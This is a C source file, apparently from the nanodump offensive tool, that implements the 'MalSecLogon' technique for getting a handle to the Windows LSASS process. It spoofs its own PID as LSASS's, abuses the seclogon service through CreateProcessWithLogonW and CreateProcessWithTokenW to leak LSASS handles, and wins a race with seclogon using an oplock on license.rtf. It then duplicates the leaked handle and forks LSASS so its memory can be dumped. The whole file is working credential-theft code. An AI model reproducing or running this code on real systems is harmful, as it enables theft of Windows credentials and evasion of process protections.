#include "malseclogon.h"
#include "handle.h"
#include "dinvoke.h"
#include "token_priv.h"

#if defined(NANO) && !defined(SSP)

VOID change_pid(
    IN DWORD new_pid,
    OUT PDWORD previous_pid)
{
    DWORD current_pid = (DWORD)READ_MEMLOC(CID_OFFSET);
    DPRINT(
        "Changing the current PID from %ld to %ld",
        current_pid,
        new_pid);
    if (previous_pid)
        *previous_pid = current_pid;
    PDWORD pPid = (PDWORD)&(((struct TEB*)NtCurrentTeb())->ClientId);
    // the memory region where the TEB is should be RW
    *pPid = new_pid;
}

VOID set_command_line(
    IN BOOL use_malseclogon_locally,
    IN LPWSTR command_line,
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig)
{
    // program path
    wchar_t program_name_w[MAX_PATH];
    mbstowcs(program_name_w, program_name, MAX_PATH);
    wcsncpy(command_line, L"\"", MAX_PATH);
    wcsncat(command_line, program_name_w, MAX_PATH);
    wcsncat(command_line, L"\"", MAX_PATH);
    if (!use_malseclogon_locally)
        return;
    // dump path
    wchar_t dump_path_w[MAX_PATH];
    mbstowcs(dump_path_w, dump_path, MAX_PATH);
    wcsncat(command_line, L" -w ", MAX_PATH);
    wcsncat(command_line, dump_path_w, MAX_PATH);
    // --fork
    if (fork_lsass)
        wcsncat(command_line, L" -f", MAX_PATH);
    // --snapshot
    if (snapshot_lsass)
        wcsncat(command_line, L" -s", MAX_PATH);
    // --valid
    if (use_valid_sig)
        wcsncat(command_line, L" -v", MAX_PATH);
    // malseclogon
    wcsncat(command_line, L" -sll", MAX_PATH);
    // --stage 2
    wcsncat(command_line, L" -s2", MAX_PATH);
}

BOOL save_new_process_pid(
    IN PPROCESS_LIST process_list,
    IN DWORD pid)
{
    if (!process_list)
        return TRUE;

    if (process_list->Count + 1 > MAX_PROCESSES)
    {
        PRINT_ERR("Too many processes, please increase MAX_PROCESSES");
        return FALSE;
    }
    process_list->ProcessId[process_list->Count++] = pid;
    return TRUE;
}

// wait until the process exits and check if the dumpfile exists
BOOL check_if_succeded(
    IN DWORD new_pid,
    IN LPCSTR dump_path)
{
    // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
    HANDLE hSpoofedProcess = get_process_handle(
        new_pid,
        SYNCHRONIZE,
        FALSE);
    if (!hSpoofedProcess)
        return FALSE;

    BOOL success = wait_for_process(hSpoofedProcess);
    if (!success)
        return FALSE;

    NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
    if (!file_exists(dump_path))
        return FALSE;

    return TRUE;
}

VOID kill_created_processes(
    IN PPROCESS_LIST created_processes)
{
    if (!created_processes)
        return;

    DPRINT(
        "Killing the %ld created processes",
        created_processes->Count);
    for (DWORD i = 0; i < created_processes->Count; i++)
    {
        kill_process(
            created_processes->ProcessId[i],
            NULL);
    }
    DPRINT("The created processes have been killed");
}

/*
 * MalSecLogon can be used agains nanodump itself (writing it to disk)
 * or use a another binary (like notepad.exe) and duplicate
 * the leaked handle in order to remain fileless
 */
BOOL malseclogon_handle_leak(
    IN LPCSTR binary_path,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST* Pcreated_processes)
{
    PPROCESS_LIST created_processes = NULL;
    BOOL success;

    DPRINT("Using MalSecLogon to get a handle to " LSASS);
    // if MalSecLogon is used to create other processes, save their PID
    if (!use_malseclogon_locally)
    {
        created_processes = intAlloc(sizeof(PROCESS_LIST));
        if (!created_processes)
        {
            *Pcreated_processes = NULL;
            malloc_failed();
            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
            return FALSE;
        }
    }
    *Pcreated_processes = created_processes;
    // leak an LSASS handle using MalSecLogon
    success = malseclogon_stage_1(
        binary_path,
        dump_path,
        fork_lsass,
        snapshot_lsass,
        use_valid_sig,
        use_malseclogon_locally,
        lsass_pid,
        created_processes);
    if (!success)
    {
        PRINT_ERR("the --malseclogon-leak-local technique failed!");
        if (created_processes)
        {
            intFree(created_processes); created_processes = NULL;
            *Pcreated_processes = NULL;
        }
        return FALSE;
    }
    if (use_malseclogon_locally)
    {
        // MalSecLogon created a new nanodump process which created the dump
        print_success(
            dump_path,
            use_valid_sig,
            TRUE);
    }
    return TRUE;
}

BOOL malseclogon_stage_1(
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST process_list)
{
    BOOL success = FALSE;
    PHANDLE_LIST handle_list = NULL;

    // if the file already exists, delete it
    if (file_exists(dump_path))
    {
        if (!delete_file(dump_path))
        {
            return FALSE;
        }
    }

    wchar_t command_line[MAX_PATH];
    set_command_line(
        use_malseclogon_locally,
        command_line,
        program_name,
        dump_path,
        fork_lsass,
        snapshot_lsass,
        use_valid_sig);

    handle_list = find_process_handles_in_process(
        lsass_pid,
        LSASS_DEFAULT_PERMISSIONS);
    if (!handle_list)
    {
        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
        return FALSE;
    }

    if (handle_list->Count == 0)
    {
        PRINT_ERR(
            "No handles found in " LSASS ", is the PID %ld correct?.",
            lsass_pid);
        intFree(handle_list); handle_list = NULL;
        return FALSE;
    }

    // change our PID to the LSASS PID
    DWORD original_pid;
    change_pid(lsass_pid, &original_pid);

    PROCESS_INFORMATION procInfo;
    STARTUPINFOW startInfo;
    wchar_t filename[MAX_PATH];
    mbstowcs(filename, program_name, MAX_PATH);

    // find the address of CreateProcessWithLogonW dynamically
    CreateProcessWithLogonW_t CreateProcessWithLogonW;
    CreateProcessWithLogonW = (CreateProcessWithLogonW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        CreateProcessWithLogonW_SW2_HASH,
        0);
    if (!CreateProcessWithLogonW)
    {
        api_not_found("CreateProcessWithLogonW");
        intFree(handle_list); handle_list = NULL;
        return FALSE;
    }

    DWORD handles_leaked = 0;
    while (handles_leaked < handle_list->Count)
    {
        memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
        memset(&startInfo, 0, sizeof(STARTUPINFOW));
        startInfo.dwFlags = STARTF_USESTDHANDLES;

        startInfo.hStdInput = handle_list->Handle[handles_leaked++];

        if (handle_list->Count > handles_leaked)
            startInfo.hStdOutput = handle_list->Handle[handles_leaked++];

        if (handle_list->Count > handles_leaked)
            startInfo.hStdError = handle_list->Handle[handles_leaked++];

        success = CreateProcessWithLogonW(
            NANODUMP_USER,
            NANODUMP_DOMAIN,
            NANODUMP_PASSWD,
            LOGON_NETCREDENTIALS_ONLY,
            filename,
            command_line,
            0,
            NULL,
            NULL,
            &startInfo,
            &procInfo);
        if (!success)
        {
            function_failed("CreateProcessWithLogonW");
            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return FALSE;
        }
        DPRINT(
            "Created new process '%ls' (PID: %ld) with CreateProcessWithLogonW to leak process handles from lsass: 0x%lx 0x%lx 0x%lx",
            filename,
            procInfo.dwProcessId,
            (DWORD)(ULONG_PTR)startInfo.hStdInput,
            (DWORD)(ULONG_PTR)startInfo.hStdOutput,
            (DWORD)(ULONG_PTR)startInfo.hStdError);

        // save the PID of the newly created process
        success = save_new_process_pid(process_list, procInfo.dwProcessId);
        if (!success)
        {
            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return FALSE;
        }

        // if MalSecLogon was used against nanodump, check if the minidump was created
        if (use_malseclogon_locally)
        {
            success = check_if_succeded(
                procInfo.dwProcessId,
                dump_path);
            if (success)
            {
                DPRINT(
                    "The dump was succesfully created at %s",
                    dump_path);
                change_pid(original_pid, NULL);
                intFree(handle_list); handle_list = NULL;
                return TRUE;
            }
        }
    }

    // restore the original PID
    change_pid(original_pid, NULL);
    intFree(handle_list); handle_list = NULL;
    if (use_malseclogon_locally)
    {
        // the new nanodump process was unable to create the minidump
        DPRINT_ERR("The created nanodump process did not create the dump");
        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
        return FALSE;
    }
    else
    {
        // all the processes with the leaked handles have been created
        DPRINT(
            "Created %ld processes, trying to duplicate one of the leaked handles to " LSASS,
            process_list->Count);
        return TRUE;
    }
}

VOID malseclogon_trigger_lock(
    IN DWORD lsass_pid,
    IN LPWSTR cmdline,
    IN PBOOL file_lock_was_triggered)
{
    DWORD original_pid = 0;
    BOOL useCreateProcessWithToken = FALSE;
    PHANDLE_LIST handle_list = NULL;
    BOOL success = FALSE;
    PROCESS_INFORMATION procInfo = { 0 };
    CreateProcessWithTokenW_t CreateProcessWithTokenW = NULL;
    CreateProcessWithLogonW_t CreateProcessWithLogonW = NULL;
    STARTUPINFO startInfo = { 0 };

    CreateProcessWithTokenW = (CreateProcessWithTokenW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        CreateProcessWithTokenW_SW2_HASH,
        0);
    if (!CreateProcessWithTokenW)
    {
        api_not_found("CreateProcessWithTokenW");
        goto end;
    }

    CreateProcessWithLogonW = (CreateProcessWithLogonW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        CreateProcessWithLogonW_SW2_HASH,
        0);
    if (!CreateProcessWithLogonW)
    {
        api_not_found("CreateProcessWithLogonW");
        goto end;
    }

    // change our PID to the LSASS PID
    change_pid(lsass_pid, &original_pid);

    // try to enable impersonation privileges
    success = enable_impersonate_priv();
    if (success)
    {
        // find token handles within LSASS
        handle_list = find_token_handles_in_process(
            lsass_pid,
            0);
        if (!handle_list || !handle_list->Count)
        {
            DPRINT("No token handles found in " LSASS ", can't use CreateProcessWithToken(). Reverting to CreateProcessWithLogon()...");
            useCreateProcessWithToken = FALSE;
        }
        else
        {
            useCreateProcessWithToken = TRUE;
        }
    }
    else
    {
        DPRINT("Impersonation privileges not available, can't use CreateProcessWithToken(). Reverting to CreateProcessWithLogon()...");
        useCreateProcessWithToken = FALSE;
    }

    // printing output in from thread after this point makes no sense

    /*
     * call CreateProcessWithTokenW/CreateProcessWithLogonW so that:
     * 1) seclogon will open a handle to our spoofed PID (LSASS)
     * 2) it will try to open a handle to our target file
     * 3) our lock will trigger and pause the execution of seclogon
     * 4) we will have plenty of time to duplicate that handle
     */

    if (useCreateProcessWithToken)
    {
        for (DWORD i = 0; i < handle_list->Count; i++)
        {
            if (*file_lock_was_triggered)
                goto end;

            memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
            memset(&startInfo, 0, sizeof(STARTUPINFOW));

            success = CreateProcessWithTokenW(
                handle_list->Handle[i],
                0,
                NULL,
                cmdline,
                0,
                NULL,
                NULL,
                (LPSTARTUPINFOW)&startInfo,
                &procInfo);
            if (success)
            {
                break;
            }
        }
    }
    else
    {
        CreateProcessWithLogonW(
            NANODUMP_USER,
            NANODUMP_DOMAIN,
            NANODUMP_PASSWD,
            LOGON_NETCREDENTIALS_ONLY,
            NULL,
            cmdline,
            0,
            NULL,
            NULL,
            (LPSTARTUPINFOW)&startInfo,
            &procInfo);
    }

end:
    if (handle_list)
        intFree(handle_list);


    // since the thread is already finishing, no need to restore our PID

    // terminate this thread
    NtTerminateThread(NULL, 0);

    return;
}

DWORD WINAPI thread_seclogon_lock(
    IN LPVOID lpParam)
{
    PTHREAD_PARAMETERS thread_params = (PTHREAD_PARAMETERS)lpParam;
    if (!thread_params)
        return -1;

    malseclogon_trigger_lock(
        thread_params->pid,
        thread_params->cmdline,
        thread_params->file_lock_was_triggered);

    return 0;
}

BOOL leak_lsass_handle_in_seclogon_with_race_condition(
    IN DWORD lsass_pid,
    OUT PHANDLE hEvent,
    OUT PHANDLE hFile)
{
    BOOL ret_val = FALSE;
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    UNICODE_STRING file_to_lock = { 0 };
    file_to_lock.Buffer = L"\\??\\C:\\Windows\\System32\\license.rtf";
    file_to_lock.Length = wcslen(file_to_lock.Buffer) * sizeof(WCHAR);
    file_to_lock.MaximumLength = file_to_lock.Length + 2;
    THREAD_PARAMETERS thread_params = { 0 };
    OVERLAPPED overlapped = { 0 };
    REQUEST_OPLOCK_INPUT_BUFFER inputBuffer = { 0 };
    REQUEST_OPLOCK_OUTPUT_BUFFER outputBuffer = { 0 };
    inputBuffer.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    inputBuffer.StructureLength = sizeof(inputBuffer);
    inputBuffer.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
    inputBuffer.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;
    outputBuffer.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    outputBuffer.StructureLength = sizeof(outputBuffer);
    BOOL file_lock_was_triggered = FALSE;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        &file_to_lock,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL);

    // get a handle to the target file
    status = NtCreateFile(
        hFile,
        FILE_GENERIC_READ,
        &objAttr,
        &IoStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE,
        NULL,
        0);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        goto end;
    }

    DPRINT("hFile: 0x%p", *hFile);

    // create an event for synchronization
    status = NtCreateEvent(
        hEvent,
        GENERIC_ALL,
        NULL,
        SynchronizationEvent,
        FALSE);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateEvent", status);
        goto end;
    }

    DPRINT("hEvent: 0x%p", *hEvent);

    overlapped.hEvent = *hEvent;

    // create a lock on the target file
    status = _NtFsControlFile(
        *hFile,
        *hEvent,
        NULL,
        &overlapped,
        (PIO_STATUS_BLOCK)&overlapped,
        FSCTL_REQUEST_OPLOCK,
        &inputBuffer,
        sizeof(inputBuffer),
        &outputBuffer,
        sizeof(outputBuffer));
    if (status != STATUS_PENDING)
    {
        syscall_failed("NtFsControlFile", status);
        goto end;
    }

    thread_params.pid = lsass_pid;
    thread_params.cmdline = &file_to_lock.Buffer[4];
    thread_params.file_lock_was_triggered = &file_lock_was_triggered;

    /*
     * we need to run CreateProcessWithToken() in a separate thread
     * because the file lock would also lock our thread
     */
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        NtCurrentProcess(),
        thread_seclogon_lock,
        &thread_params,
        0,
        0,
        0,
        0,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateThreadEx", status);
        goto end;
    }

    // wait until seclogon accesses the target file
    status = NtWaitForSingleObject(
        *hEvent,
        FALSE,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWaitForSingleObject", status);
        goto end;
    }

    // if we are here, then seclogon triggered the lock
    file_lock_was_triggered = TRUE;

    ret_val = TRUE;

    DPRINT("Seclogon thread locked. An lsass handle will be available inside the seclogon process!");

end:
    if (hThread)
        NtClose(hThread);

    return ret_val;
}

DWORD get_pid_using_file_path(
    IN LPWSTR file_path)
{
    DWORD pid = 0;
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    UNICODE_STRING ustr_file_path = { 0 };
    ustr_file_path.Buffer = file_path;
    ustr_file_path.Length = wcslen(ustr_file_path.Buffer) * sizeof(WCHAR);
    ustr_file_path.MaximumLength = ustr_file_path.Length + 2;
    PFILE_PROCESS_IDS_USING_FILE_INFORMATION pfpiufi = NULL;
    ULONG pfpiufiLen = 0;
    PULONG_PTR processIdListPtr = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        &ustr_file_path,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL);

    status = NtCreateFile(
        &hFile,
        FILE_GENERIC_READ,
        &objAttr,
        &IoStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        goto end;
    }

    do
    {
        pfpiufiLen += 8192;
        pfpiufi = intAlloc(pfpiufiLen);
        if (!pfpiufi)
        {
            malloc_failed();
            goto end;
        }
        memset(&IoStatusBlock, 0, sizeof(IO_STATUS_BLOCK));
        status = NtQueryInformationFile(
            hFile,
            &IoStatusBlock,
            pfpiufi,
            pfpiufiLen,
            (FILE_INFORMATION_CLASS)FileProcessIdsUsingFileInformation);
        if (NT_SUCCESS(status))
            break;

        intFree(pfpiufi); pfpiufi = NULL;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQueryInformationFile", status);
        goto end;
    }

    processIdListPtr = pfpiufi->ProcessIdList;
    // we return only the first pid, it's usually the right one
    if (pfpiufi->NumberOfProcessIdsInList >= 1)
        pid = *processIdListPtr;

end:
    if (hFile)
        NtClose(hFile);
    if (pfpiufi)
        intFree(pfpiufi);

    return pid;
}

DWORD get_seclogon_pid(VOID)
{
    DWORD seclogon_pid = 0;
    PROCESS_INFORMATION procInfo = { 0 };
    STARTUPINFO startInfo = { 0 };
    CreateProcessWithTokenW_t CreateProcessWithTokenW = NULL;

    seclogon_pid = get_pid_using_file_path(L"\\??\\C:\\Windows\\System32\\seclogon.dll");
    if (!seclogon_pid)
    {
        DPRINT("Seclogon service not running, try to wake up");

        CreateProcessWithTokenW = (CreateProcessWithTokenW_t)(ULONG_PTR)get_function_address(
            get_library_address(ADVAPI32_DLL, TRUE),
            CreateProcessWithTokenW_SW2_HASH,
            0);
        if (!CreateProcessWithTokenW)
        {
            api_not_found("CreateProcessWithTokenW");
            return 0;
        }

        CreateProcessWithTokenW(
            NtCurrentProcess(),
            0,
            NULL,
            L"cmd",
            0,
            NULL,
            NULL,
            (LPSTARTUPINFOW)&startInfo,
            &procInfo);

        // try to get PID now
        seclogon_pid = get_pid_using_file_path(L"\\??\\C:\\Windows\\System32\\seclogon.dll");
    }

    if (procInfo.dwProcessId)
    {
        kill_process(0, procInfo.hProcess);
        NtClose(procInfo.hProcess);
        NtClose(procInfo.hThread);
    }

    return seclogon_pid;
}

HANDLE malseclogon_race_condition(
    IN DWORD lsass_pid)
{
    BOOL success = FALSE;
    HANDLE hSeclogon = NULL;
    HANDLE hDupedHandle = NULL;
    PHANDLE_LIST handle_list = NULL;
    DWORD seclogon_pid = 0;
    HANDLE hProcess = NULL;
    HANDLE hEvent = NULL;
    HANDLE hFile = NULL;
    DWORD permissions = 0 ;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    seclogon_pid = get_seclogon_pid();
    if (!seclogon_pid)
    {
        DPRINT_ERR("Failed to find the PID of the seclogon process");
        goto end;
    }
    DPRINT("seclogon.dll PID: %ld", seclogon_pid);

    success = leak_lsass_handle_in_seclogon_with_race_condition(
        lsass_pid,
        &hEvent,
        &hFile);
    if (!success)
        goto end;

    /*
     * these are the permissions used by seclogon
     * to open a handle to the calling process
     */
    permissions  = 0;
    permissions |= PROCESS_QUERY_INFORMATION;
    permissions |= PROCESS_QUERY_LIMITED_INFORMATION;
    permissions |= PROCESS_CREATE_PROCESS;
    permissions |= PROCESS_DUP_HANDLE;

    // look for a handle owned by seclogon with the specified permissions
    handle_list = find_process_handles_in_process(
        seclogon_pid,
        permissions);
    if (!handle_list || !handle_list->Count)
    {
        PRINT_ERR("No process handles found in seclogon. The race condition didn't work.");
        goto end;
    }

    // get a handle to seclogon
    hSeclogon = get_process_handle(
        seclogon_pid,
        PROCESS_DUP_HANDLE,
        TRUE);
    if (!hSeclogon)
    {
        PRINT_ERR("Could not open handle to seclogon");
        goto end;
    }
    // loop over each handle owned by seclogon
    for (DWORD i = 0; i < handle_list->Count; i++)
    {
        DPRINT("Testing handle %ld of %ld", i + 1, handle_list->Count);

        // duplicate the handle
        hDupedHandle = NULL;
        status = NtDuplicateObject(
            hSeclogon,
            handle_list->Handle[i],
            NtCurrentProcess(),
            &hDupedHandle,
            0,
            0,
            DUPLICATE_SAME_ACCESS);
        if (!NT_SUCCESS(status))
        {
            DPRINT("Could not duplicate handle");
            continue;
        }

        // if not lsass, continue
        if (!is_lsass(hDupedHandle))
        {
            DPRINT("The handle was not from" LSASS);
            NtClose(hDupedHandle); hDupedHandle = NULL;
            continue;
        }

        DPRINT("Found " LSASS " handle");

        /*
         * create a 'clone' of the LSASS process,
         * taking advantage the fact that the handle
         * we duplicated has PROCESS_CREATE_PROCESS
         */
        hProcess = fork_process(
            hDupedHandle);
        if (hProcess)
        {
            // the handle is closed by fork_process
            hDupedHandle = NULL;
            break;
        }
    }

end:
    if (handle_list)
        intFree(handle_list);
    if (hSeclogon)
        NtClose(hSeclogon);
    if (hDupedHandle)
        NtClose(hDupedHandle);
    if (hEvent)
        NtClose(hEvent);
    if (hFile)
        NtClose(hFile);

    return hProcess;
}

#ifdef EXE

HANDLE malseclogon_stage_2(
    IN LPCSTR dump_path)
{
    // if the file already exists, exit
    if (file_exists(dump_path))
        return NULL;

    BOOL found_handle = FALSE;
    HANDLE hProcess = NULL;
    for (DWORD leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4)
    {
        if (found_handle || !is_lsass((HANDLE)(ULONG_PTR)leakedHandle))
        {
            NtClose((HANDLE)(ULONG_PTR)leakedHandle);
            continue;
        }
        // found LSASS handle
        hProcess = (HANDLE)(ULONG_PTR)leakedHandle;
        // close all the other handles
        found_handle = TRUE;
    }
    return hProcess;
}
#endif

#endif
